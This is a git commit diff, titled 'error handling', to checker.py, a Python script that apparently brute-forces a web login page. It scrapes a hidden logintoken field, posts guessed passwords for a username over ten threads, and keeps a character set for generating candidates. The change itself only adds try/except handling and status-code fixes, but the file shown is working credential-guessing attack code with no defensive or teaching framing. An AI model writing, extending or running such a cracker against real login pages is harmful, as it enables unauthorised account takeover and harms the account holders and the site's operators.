3a3a08201f329f596b65424601aa3df9616dd54f
RythenGlyth <rythenglyth@gmail.com>
2021-04-07 15:45:06 +0200

    error handling

--- checker.py
+++ checker.py
@@ -12,33 +12,36 @@ loginTokenRegex = re.compile('type="hidden" name="logintoken" value="(\w*)"', re
 threadCount = 10
 
 def check(username, password):
-    req = requests.session()
-    req.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"})
-    res = req.get(url)
-    if res.status_code == 200:
-        Ltoken = loginTokenRegex.search(res.text).group(1)
-        res2 = req.post(url, data={
-            "ajax": True,
-            "anchor": "",
-            "logintoken": Ltoken,
-            "username": username,
-            "password": password,
-            "token": "",
-        })
-        if res2.status_code == 200:
-            err = res2.json()["error"]
-            if err == "":
-                return True
+    try:
+        req = requests.session()
+        req.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"})
+        res = req.get(url)
+        if res.status_code == 200:
+            Ltoken = loginTokenRegex.search(res.text).group(1)
+            res2 = req.post(url, data={
+                "ajax": True,
+                "anchor": "",
+                "logintoken": Ltoken,
+                "username": username,
+                "password": password,
+                "token": "",
+            })
+            if res2.status_code == 200:
+                err = res2.json()["error"]
+                if err == "":
+                    return True
+                else:
+                    print(password + ": " + err)
+                    return False
             else:
-                print(password + ": " + err)
+                print("Fehler LOL2 ("+ str(res.status_code) + ")")
+                print(res2)
                 return False
         else:
-            print("Fehler LOL2 ("+ res.status_code + ")")
-            print(res2)
+            print("Fehler LOL1 ("+ str(res.status_code) + ")") 
             return False
-    else:
-        print("Fehler LOL1 ("+ res.status_code + ")") 
-        return False
+    except:
+        print(password + ": " + "Error")
 
 chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVW1234567890,.-#+^°!"§$%&/()=?{[]}\\;:_\'*~'
 charlenght = len(chars)
